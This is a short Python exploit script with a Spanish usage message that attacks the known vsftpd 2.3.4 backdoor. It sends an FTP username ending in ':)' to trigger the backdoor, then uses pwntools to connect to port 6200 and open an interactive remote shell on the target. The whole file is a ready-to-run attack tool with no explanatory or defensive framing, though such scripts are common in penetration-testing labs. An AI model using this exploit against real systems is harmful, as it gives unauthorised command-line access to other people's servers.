#!/usr/bin/python3

import socket, sys
from time import sleep
from pwn import *

def FtpConnect(ip_addr, port):

    ftp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    ftp_socket.connect((ip_addr, port))

    banner = ftp_socket.recv(1024)

    ftp_socket.send(b'USER a:)\r\n')

    response1 = ftp_socket.recv(1024)

    ftp_socket.send(b'PASS b\r\n')

    ftp_socket.close()

def GetShell(ip_addr):

    time.sleep(1)
    
    context.log_level = 'error'

    shell_socket = remote(ip_addr,6200)
    shell_socket.interactive()

    shell_socket.close()

if __name__ == '__main__':

    if (len(sys.argv) < 3):
        print("USO: exploit.py <direccion ip> <puerto>")
        sys.exit(1)

    ip_addr = str(sys.argv[1])
    port = int(sys.argv[2])

    FtpConnect(ip_addr, port)
    GetShell(ip_addr)